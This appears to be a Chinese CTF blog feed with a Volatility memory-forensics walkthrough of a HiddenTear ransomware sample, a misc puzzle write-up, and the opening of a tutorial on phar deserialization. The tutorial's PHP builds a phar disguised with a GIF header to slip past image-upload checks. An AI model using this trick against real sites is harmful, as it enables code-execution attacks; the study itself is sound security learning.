170 2018-08-04 19:33:41 UTC+0000</span><br><span class="line">.. 0xfffffa801aa00a90:chrome.exe                     3924   4076     16    228 2018-08-04 19:29:51 UTC+0000</span><br><span class="line">.. 0xfffffa801a635240:chrome.exe                     3648   4076     16    207 2018-08-04 19:33:38 UTC+0000</span><br><span class="line">.. 0xfffffa801a502b30:chrome.exe                      576   4076      2     58 2018-08-04 19:29:31 UTC+0000</span><br><span class="line">.. 0xfffffa801a4f7b30:chrome.exe                     1808   4076     13    229 2018-08-04 19:29:32 UTC+0000</span><br><span class="line">.. 0xfffffa801a7f98f0:chrome.exe                     2748   4076     15    181 2018-08-04 19:31:15 UTC+0000</span><br><span class="line">. 0xfffffa801b5cb740:LunarMS.exe                      708   2728     18    346 2018-08-04 19:27:39 UTC+0000</span><br><span class="line">. 0xfffffa801b1cdb30:vmtoolsd.exe                    2804   2728      6    190 2018-08-04 19:27:06 UTC+0000</span><br><span class="line">. 0xfffffa801b290b30:BitTorrent.exe                  2836   2728     24    471 2018-08-04 19:27:07 UTC+0000</span><br><span class="line">.. 0xfffffa801b4c9b30:bittorrentie.e                 2624   2836     13    316 2018-08-04 19:27:21 UTC+0000</span><br><span class="line">.. 0xfffffa801b4a7b30:bittorrentie.e                 2308   2836     15    337 2018-08-04 19:27:19 UTC+0000</span><br><span class="line"> 0xfffffa8018d44740:System                              4      0     95    411 2018-08-04 19:26:03 UTC+0000</span><br><span class="line">. 0xfffffa801947e4d0:smss.exe                         260      4      2     30 2018-08-04 19:26:03 UTC+0000</span><br><span class="line"> 0xfffffa801a2ed060:wininit.exe                       396    336      3     78 2018-08-04 19:26:11 UTC+0000</span><br><span class="line">. 0xfffffa801ab377c0:services.exe                     492    396     11    242 2018-08-04 19:26:12 UTC+0000</span><br><span class="line">.. 0xfffffa801afe7800:svchost.exe                    1948    492      6     96 2018-08-04 19:26:42 UTC+0000</span><br><span class="line">.. 0xfffffa801ae92920:vmtoolsd.exe                   1428    492      9    313 2018-08-04 19:26:27 UTC+0000</span><br><span class="line">... 0xfffffa801a572b30:cmd.exe                       3916   1428      0 ------ 2018-08-04 19:34:22 UTC+0000</span><br><span class="line">.. 0xfffffa801ae0f630:VGAuthService.                 1356    492      3     85 2018-08-04 19:26:25 UTC+0000</span><br><span class="line">.. 0xfffffa801abbdb30:vmacthlp.exe                    668    492      3     56 2018-08-04 19:26:16 UTC+0000</span><br><span class="line">.. 0xfffffa801aad1060:Lavasoft.WCAss                 3496    492     14    473 2018-08-04 19:33:49 UTC+0000</span><br><span class="line">.. 0xfffffa801a6af9f0:svchost.exe                     164    492     12    147 2018-08-04 19:28:42 UTC+0000</span><br><span class="line">.. 0xfffffa801ac2e9e0:svchost.exe                     808    492     22    508 2018-08-04 19:26:18 UTC+0000</span><br><span class="line">... 0xfffffa801ac753a0:audiodg.exe                    960    808      7    151 2018-08-04 19:26:19 UTC+0000</span><br><span class="line">.. 0xfffffa801ae7f630:dllhost.exe                    1324    492     15    207 2018-08-04 19:26:42 UTC+0000</span><br><span class="line">.. 0xfffffa801a6c2700:mscorsvw.exe                   3124    492      7     77 2018-08-04 19:28:43 UTC+0000</span><br><span class="line">.. 0xfffffa801b232060:sppsvc.exe                     2500    492      4    149 2018-08-04 19:26:58 UTC+0000</span><br><span class="line">.. 0xfffffa801abebb30:svchost.exe                     712    492      8    301 2018-08-04 19:26:17 UTC+0000</span><br><span class="line">.. 0xfffffa801ad718a0:svchost.exe                    1164    492     18    312 2018-08-04 19:26:23 UTC+0000</span><br><span class="line">.. 0xfffffa801ac31b30:svchost.exe                     844    492     17    396 2018-08-04 19:26:18 UTC+0000</span><br><span class="line">... 0xfffffa801b1fab30:dwm.exe                       2704    844      4     97 2018-08-04 19:27:04 UTC+0000</span><br><span class="line">.. 0xfffffa801988c2d0:PresentationFo                  724    492      6    148 2018-08-04 19:27:52 UTC+0000</span><br><span class="line">.. 0xfffffa801b603610:mscorsvw.exe                    412    492      7     86 2018-08-04 19:28:42 UTC+0000</span><br><span class="line">.. 0xfffffa8018e3c890:svchost.exe                     604    492     11    376 2018-08-04 19:26:16 UTC+0000</span><br><span class="line">... 0xfffffa8019124b30:WmiPrvSE.exe                  1800    604      9    222 2018-08-04 19:26:39 UTC+0000</span><br><span class="line">... 0xfffffa801b112060:WmiPrvSE.exe                  2136    604     12    324 2018-08-04 19:26:51 UTC+0000</span><br><span class="line">.. 0xfffffa801ad5ab30:spoolsv.exe                    1120    492     14    346 2018-08-04 19:26:22 UTC+0000</span><br><span class="line">.. 0xfffffa801ac4db30:svchost.exe                     868    492     45   1114 2018-08-04 19:26:18 UTC+0000</span><br><span class="line">.. 0xfffffa801a6e4b30:svchost.exe                    3196    492     14    352 2018-08-04 19:28:44 UTC+0000</span><br><span class="line">.. 0xfffffa801acd37e0:svchost.exe                     620    492     19    415 2018-08-04 19:26:21 UTC+0000</span><br><span class="line">.. 0xfffffa801b1e9b30:taskhost.exe                   2344    492      8    193 2018-08-04 19:26:57 UTC+0000</span><br><span class="line">.. 0xfffffa801ac97060:svchost.exe                    1012    492     12    554 2018-08-04 19:26:20 UTC+0000</span><br><span class="line">.. 0xfffffa801b3aab30:SearchIndexer.                 3064    492     11    610 2018-08-04 19:27:14 UTC+0000</span><br><span class="line">.. 0xfffffa801aff3b30:msdtc.exe                      1436    492     14    155 2018-08-04 19:26:43 UTC+0000</span><br><span class="line">. 0xfffffa801ab3f060:lsass.exe                        500    396      7    610 2018-08-04 19:26:12 UTC+0000</span><br><span class="line">. 0xfffffa801ab461a0:lsm.exe                          508    396     10    148 2018-08-04 19:26:12 UTC+0000</span><br><span class="line"> 0xfffffa801a0c8380:csrss.exe                         348    336      9    563 2018-08-04 19:26:10 UTC+0000</span><br><span class="line">. 0xfffffa801a6643d0:conhost.exe                     2420    348      0     30 2018-08-04 19:34:22 UTC+0000</span><br><span class="line"> 0xfffffa80198d3b30:csrss.exe                         388    380     11    460 2018-08-04 19:26:11 UTC+0000</span><br><span class="line"> 0xfffffa801aaf4060:winlogon.exe                      432    380      3    113 2018-08-04 19:26:11 UTC+0000</span><br><span class="line"> 0xfffffa801b18f060:WebCompanionIn                   3880   1484     15    522 2018-08-04 19:33:07 UTC+0000</span><br><span class="line">. 0xfffffa801aa72b30:sc.exe                          3504   3880      0 ------ 2018-08-04 19:33:48 UTC+0000</span><br><span class="line">. 0xfffffa801aeb6890:sc.exe                           452   3880      0 ------ 2018-08-04 19:33:48 UTC+0000</span><br><span class="line">. 0xfffffa801a6268b0:WebCompanion.e                  3856   3880     15    386 2018-08-04 19:34:05 UTC+0000</span><br><span class="line">. 0xfffffa801b08f060:sc.exe                          3208   3880      0 ------ 2018-08-04 19:33:47 UTC+0000</span><br><span class="line">. 0xfffffa801ac01060:sc.exe                          2028   3880      0 ------ 2018-08-04 19:33:49 UTC+0000</span><br><span class="line"> 0xfffffa801b1fd960:notepad.exe                      3304   3132      2     79 2018-08-04 19:34:10 UTC+0000</span><br><span class="line">                </span><br></pre></td></tr></table></figure>

<p>其中有个很奇怪的vmware-tray.exe居然是Rick And Morty的子进程，非常奇怪，</p>
<p>可以用dlllist查看一下进程相关的dll文件列表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720 </span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">************************************************************************</span><br><span class="line">vmware-tray.ex pid:   3720</span><br><span class="line">Command line : &quot;C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Base                             Size          LoadCount LoadTime                       Path</span><br><span class="line">------------------ ------------------ ------------------ ------------------------------ ----</span><br><span class="line">0x0000000000ec0000            0x6e000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe</span><br><span class="line">0x00000000776f0000           0x1a9000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll</span><br><span class="line">0x0000000075210000            0x3f000                0x3 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64.dll</span><br><span class="line">0x00000000751b0000            0x5c000                0x1 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64win.dll</span><br><span class="line">0x00000000751a0000             0x8000                0x1 2018-08-04 19:33:03 UTC+0000   C:\Windows\SYSTEM32\wow64cpu.dll</span><br><span class="line">0x0000000000ec0000            0x6e000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe</span><br><span class="line">0x00000000778d0000           0x180000             0xffff 1970-01-01 00:00:00 UTC+0000   C:\Windows\SysWOW64\ntdll.dll</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>这个进程的执行目录是temp，一看就不是正经程序</p>
<blockquote>
<p>CTF{vmware-tray.exe}</p>
</blockquote>
<h1 id="Path-To-Glory"><a href="#Path-To-Glory" class="headerlink" title="Path To Glory"></a>Path To Glory</h1><p><img src="https://s2.loli.net/2022/06/06/Wbv4aLKAZXSDRUy.png" alt="img"></p>
<p>这个题目有点意义不明，不明确flag内容到底应该是什么</p>
<p>由于上一题了解到，恶意进程的父进程是Rick And Morty，那么先用filescan找一找这个文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 filescan|grep &#x27;Rick And Morty&#x27;</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">0x000000007d63dbc0     10      0 R--r-d \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe</span><br><span class="line">0x000000007d8813c0      2      0 RW-rwd \Device\HarddiskVolume1\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrent</span><br><span class="line">0x000000007da56240      2      0 RW-rwd \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe</span><br><span class="line">0x000000007dae9350      2      0 RWD--- \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\BitTorrent\Rick And Morty season 1 download.exe.1.torrent</span><br><span class="line">0x000000007dcbf6f0      2      0 RW-rwd \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\BitTorrent\Rick And Morty season 1 download.exe.1.torrent</span><br><span class="line">0x000000007e710070      8      0 R--rwd \Device\HarddiskVolume1\Torrents\Rick And Morty season 1 download.exe</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>一共6个文件，其中有三个exe和三个种子文件，我们要分析来源就要关注种子文件，里面可能放着地址信息</p>
<p>先用dumpfiles转储文件，-Q指定内存地址，把三个种子都拿出来分析</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007d8813c0 -D ./</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">DataSectionObject 0x7d8813c0   None   \Device\HarddiskVolume1\Users\Rick\Downloads\Rick And Morty season 1 download.exe.torrent</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# strings file.None.0xfffffa801af10010.dat</span><br><span class="line">[ZoneTransfer]</span><br><span class="line">ZoneId=3</span><br><span class="line">                                                                                                                               </span><br><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# strings file.None.0xfffffa801b42c9e0.dat </span><br><span class="line">d8:announce44:udp://tracker.openbittorrent.com:80/announce13:announce-listll44:udp://tracker.openbittorrent.com:80/announceel42:udp://tracker.opentrackr.org:1337/announceee10:created by17:BitTorrent/7.10.313:creation datei1533150595e8:encoding5:UTF-84:infod6:lengthi456670e4:name36:Rick And Morty season 1 download.exe12:piece lengthi16384e6:pieces560:\I</span><br><span class="line">!PC&lt;^X</span><br><span class="line">B.k_Rk</span><br><span class="line">0&lt;;O87o</span><br><span class="line">!4^&quot;</span><br><span class="line">3hq,</span><br><span class="line">&amp;iW1|</span><br><span class="line">K68:o</span><br><span class="line">w~Q~YT</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$o9p</span></span></span><br><span class="line">bwF:u</span><br><span class="line">e7:website19:M3an_T0rren7_4_R!cke</span><br><span class="line">                                                                                                                               </span><br><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# strings file.None.0xfffffa801b51ccf0.dat </span><br><span class="line">[ZoneTransfer]</span><br><span class="line">ZoneId=3</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>第二个种子文件中有个website字段M3an_T0rren7_4_R!cke非常可疑</p>
<p>当作答案提交一下，结果错了，最后上网发现末尾的e是没有的，我也不知道为啥</p>
<blockquote>
<p>CTF{M3an_T0rren7_4_R!ck}</p>
</blockquote>
<h1 id="Path-To-Glory-2"><a href="#Path-To-Glory-2" class="headerlink" title="Path To Glory 2"></a>Path To Glory 2</h1><p><img src="https://s2.loli.net/2022/06/06/RFMDy4O3GKzE8Am.png" alt="img"></p>
<p>这个题目更迷了，猜不透让我交啥，这里我看了一下网上办法</p>
<p>先把所有的chrome浏览器进程转储下来，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 memdump -n chrome.exe  -D ./chrome</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">************************************************************************</span><br><span class="line">Writing chrome.exe [  4076] to 4076.dmp</span><br><span class="line">************************************************************************</span><br><span class="line">Writing chrome.exe [  4084] to 4084.dmp</span><br><span class="line">************************************************************************</span><br><span class="line">Writing chrome.exe [   576] to 576.dmp</span><br><span class="line">************************************************************************</span><br><span class="line">Writing chrome.exe [  1808] to 1808.dmp</span><br><span class="line">************************************************************************</span><br><span class="line">Writing chrome.exe [  3924] to 3924.dmp</span><br><span class="line">************************************************************************</span><br><span class="line">Writing chrome.exe [  2748] to 2748.dmp</span><br><span class="line">************************************************************************</span><br><span class="line">Writing chrome.exe [  3648] to 3648.dmp</span><br><span class="line">************************************************************************</span><br><span class="line">Writing chrome.exe [  1796] to 1796.dmp</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>再看看有没有和Rick And Morty相关的信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# strings ./chrome/* | grep &#x27;Rick And Morty season 1 download.exe&#x27; -C 10</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">--</span><br><span class="line">wCachePathe</span><br><span class="line">.CachePrefix</span><br><span class="line">CacheLimite</span><br><span class="line">CacheOptions</span><br><span class="line">CacheRepair</span><br><span class="line">GOOGLE~1.LNK</span><br><span class="line">MAPLES~1.URL</span><br><span class="line">BITTOR~1.LNK</span><br><span class="line">Flag.txt</span><br><span class="line">Flag.txt</span><br><span class="line">Rick And Morty season 1 download.exe.lnk</span><br><span class="line">Rick And Morty season 1 download.exe.lnk</span><br><span class="line">.WINDOWS</span><br><span class="line">OpenWithListp</span><br><span class="line">&#123;1NP14R77-02R7-4R5Q-O744-2RO1NR5198O7&#125;\ehaqyy32.rkr</span><br><span class="line">MRUList</span><br><span class="line">.WINDOWS</span><br><span class="line">.tor</span><br><span class="line">.txt</span><br><span class="line">.WIN</span><br><span class="line">.ziphx</span><br><span class="line">Foldv</span><br><span class="line">--</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">--</span><br><span class="line">display:inline;width:56px;height:200px;m&gt;</span><br><span class="line">Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@inYear</span><br><span class="line">//sec-s.uicdn.com/nav-cdn/home/preloader.gif</span><br><span class="line">simple-icon_toolbar-change-view-horizontal</span><br><span class="line"> nnx-track-sec-click-communication-inboxic.com</span><br><span class="line">nx-track-sec-click-dashboard-hide_smileyable</span><br><span class="line">Nftd-box stem-north big fullsize js-focusable</span><br><span class="line">js-box-flex need-overlay js-componentone</span><br><span class="line">Jhttps://search.mail.com/web [q origin ]Year</span><br><span class="line">ntrack-and-trace__delivery-info--has-iconf</span><br><span class="line">Rick And Morty season 1 download.exe.torrent</span><br><span class="line">tbl_1533411035475_7.0.1.40728_2033115181</span><br><span class="line">panel-mail-display-table-mail-default35&quot;</span><br><span class="line">Cnpanel-mail-display-table-mail-horizontal.js</span><br><span class="line">trc_rbox text-links-a trc-content-sponsored </span><br><span class="line">identity_OjpwcmVsb2FkZXIuaHRtbC50d2ln</span><br><span class="line">Move the widget to its desired position.3c8=</span><br><span class="line">Set-Cookie, no-store, proxy-revalidateHxRKw=</span><br><span class="line">Set-Cookie, no-store, proxy-revalidate143/</span><br><span class="line">tbl_1533411035475_7.0.9.40728_2033115181</span><br><span class="line">&quot;mail.com Update&quot; &lt;service@corp.mail.com&gt;e</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>找到的结果中<code>Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@in</code>即为flag，然后结果中意外的发现了flag.txt，后面会用到</p>
<blockquote>
<p>CTF{Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@in}</p>
</blockquote>
<h1 id="Bit-4-Bit"><a href="#Bit-4-Bit" class="headerlink" title="Bit 4 Bit"></a>Bit 4 Bit</h1><p><img src="https://s2.loli.net/2022/06/06/k4lOQVTBC2p3wSK.png" alt="img"></p>
<p>题目告诉我们这个恶意进程是一个勒索软件，要我们找出攻击者的比特币账户地址，那我们肯定是要先把恶意软件dump下来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3720  -D ./</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Process(V)         ImageBase          Name                 Result</span><br><span class="line">------------------ ------------------ -------------------- ------</span><br><span class="line">0xfffffa801a4c5b30 0x0000000000ec0000 vmware-tray.ex       OK: executable.3720.exe</span><br><span class="line">              </span><br></pre></td></tr></table></figure>

<p>接下来就是用dnspy进行逆向分析（直接看伪代码）</p>
<p><img src="https://s2.loli.net/2022/06/06/BXgaGK6yqkZY2UH.png" alt="img"></p>
<p>在form3中可以看到这个软件的显示的信息，直接把address写出来了</p>
<blockquote>
<p>CTF{1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M}</p>
</blockquote>
<h1 id="Graphic’s-For-The-Weak"><a href="#Graphic’s-For-The-Weak" class="headerlink" title="Graphic’s For The Weak"></a>Graphic’s For The Weak</h1><p><img src="https://s2.loli.net/2022/06/06/hxLA4GRpJ7EKQl9.png" alt="img"></p>
<p>要找到图片的隐藏信息，那就继续分析，在资源中查看图片，直接可以看到隐藏信息</p>
<p><img src="https://s2.loli.net/2022/06/06/p5Cj9JOhqylLtXz.png" alt="img"></p>
<blockquote>
<p>CTF{S0_Just_M0v3_Socy}</p>
</blockquote>
<h1 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h1><p><img src="https://s2.loli.net/2022/06/06/NqHuRQfCoAxcgle.png" alt="img"></p>
<p>这一题就是找出加密文件所使用的密码</p>
<p><img src="https://s2.loli.net/2022/06/06/Wm9LFtYje8MVvxA.png" alt="img"></p>
<p>分析exe可以看到两个函数，第一个创建密码是随机的，然后有一个发送密码，是把computerName和userName还有password拼接以后进行发送</p>
<p>可以分析出compuerName就是WIN-LO6FAF3DTFE，用户名是Rick，所以这个函数发送的字符串应该是<code>WIN-LO6FAF3DTFE-Rick password</code>，我们直接去这个勒索软件的内存中寻找相关字符串即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# strings -el ./3720.dmp | grep &#x27;WIN-LO6FAF3DTFE-Rick&#x27; -C 5 </span><br><span class="line">\Desktop\</span><br><span class="line">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&amp;?&amp;/</span><br><span class="line">aDOBofVYUNVnmp7</span><br><span class="line">aDOBofVYUNVnmp7</span><br><span class="line">C:\Users\Rick\Desktop\</span><br><span class="line">WIN-LO6FAF3DTFE-Rick aDOBofVYUNVnmp7</span><br><span class="line">.txt</span><br><span class="line">.doc</span><br><span class="line">.docx</span><br><span class="line">.xls</span><br><span class="line">.xlsx</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>-el参数的e指定了字符编码，l为小端编码，如果想用大端就是-eb</p>
<p>这里搜索到的<code>aDOBofVYUNVnmp7</code>就是password</p>
<blockquote>
<p>CTF{aDOBofVYUNVnmp7}</p>
</blockquote>
<h1 id="Closure"><a href="#Closure" class="headerlink" title="Closure"></a>Closure</h1><p><img src="https://s2.loli.net/2022/06/06/isuTOVKZvbMzJHB.png" alt="img"></p>
<p>最后一题要解密文件，容易想到前面提到的flag文件，这个flag文件应该是被加密过的，但我们已经知道密码了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 filescan|grep -i &#x27;flag&#x27;</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">0x000000007d61b070     16      0 RW-rw- \Device\HarddiskVolume1\Users\Rick\AppData\Roaming\Microsoft\Windows\Recent\Flag.txt.WINDOWS.lnk</span><br><span class="line">0x000000007e410890     16      0 R--r-- \Device\HarddiskVolume1\Users\Rick\Desktop\Flag.txt</span><br><span class="line">                                                                                         </span><br><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -D ./</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">DataSectionObject 0x7e410890   None   \Device\HarddiskVolume1\Users\Rick\Desktop\Flag.txt</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>先找到flag文件，并且转储下来</p>
<p><strong>解密过程</strong></p>
<p>已知这个勒索软件为HiddenTear，直接在网上找到解密程序HiddenTearDecrypter</p>
<p>先将加密文件的末尾多余的0去掉，再把后缀加上locked</p>
<p><img src="https://s2.loli.net/2022/06/06/2dspvnHAlErat97.png" alt="img"></p>
<p>拿去解密，密钥已经知道了，直接输入</p>
<p><img src="https://s2.loli.net/2022/06/06/zlAvDP6SVfc37ea.png" alt="img"></p>
<p><img src="https://s2.loli.net/2022/06/06/dPUVHQtRc2xbWMT.png" alt="img"></p>
<blockquote>
<p>CTF{Im_Th@_B3S7_RicK_0f_Th3m_4ll}</p>
</blockquote>
]]></content>
      <tags>
        <tag>取证</tag>
      </tags>
  </entry>
  <entry>
    <title>春秋杯2021-勇者山峰 secret_chart</title>
    <url>/2021/11/28/secret-chart/</url>
    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/ab0fa9bad45e4f449eb11863e0b15b6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开附件是一张png图片<br><img src="https://img-blog.csdnimg.cn/5d163565915e4d8c96c821639ebb6e77.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用010查看图片发现存在PK文本，分离出压缩包<br><img src="https://img-blog.csdnimg.cn/639ab96d4459464dbc1f103243d73080.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>该压缩包需要解压密码，但本题没用给出任何提示，只能使用工具爆破<br><img src="https://img-blog.csdnimg.cn/69bbc81104db405593875541fb9f628f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>密码为9572，解压后得到表格<br><img src="https://img-blog.csdnimg.cn/f723159a48fd44a39737f6c3f5c2bfdd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>将表格合并后得到24*24的列表，想到可能是二维码，于是把所以为1的格子全部设置为黑色，得到Data Matrix码<br><img src="https://img-blog.csdnimg.cn/026638bb0cad47b2b471501f5c174ce1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用<a href="http://boy.co.ua/decode.php">DataMatrix二维码在线解码工具</a>解析可以得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/16597b05a014461db1d65ca52302237c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><code>zfua&#123;B3s1o9in1Nw0halUnofuNc0HM1&#125;</code><br>使用凯撒密码解析</p>
<p><img src="https://img-blog.csdnimg.cn/f3387e4afa1e42efa994c963515976a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到flag</p>
]]></content>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>从一道题中学习Soap SSRF和phar反序列化组合拳</title>
    <url>/2022/01/24/showmeadmin/</url>
    <content><![CDATA[</font>

<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年的一道比赛题，一直没来得及看，借着复现的机会学习了一下phar反序列化和Soap ssrf，仔细研究官方wp后发现这题竟然如此精妙，感叹良久，必须写篇博客记录学习一下</p>
<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>phar反序列化即在文件系统函数，如<code>file_exists()</code>和<code>is_dir()</code>等，在参数可控的情况下，配合<code>phar://</code>伪协议，可以不依赖<code>unserialize()</code>直接进行反序列化操作，这里只写下简单介绍，后面几天再详细学习一下phar</p>
<p>一个phar文件包括四个部分：</p>
<ul>
<li>a <strong>stub</strong>：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</li>
<li>a <strong>manifest</strong> describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<code>序列化</code>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</li>
<li>the file <strong>contents</strong>：被压缩文件的内容。</li>
<li>(optional) a <strong>signature</strong> for verifying Phar integrity (phar file format only)：签名，放在文件末尾</li>
</ul>
<p>如下为示例，构造一个phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">//设置stub,添加GIF头，可以绕过图片格式检查</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>（注意：要将php.ini中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。）</p>
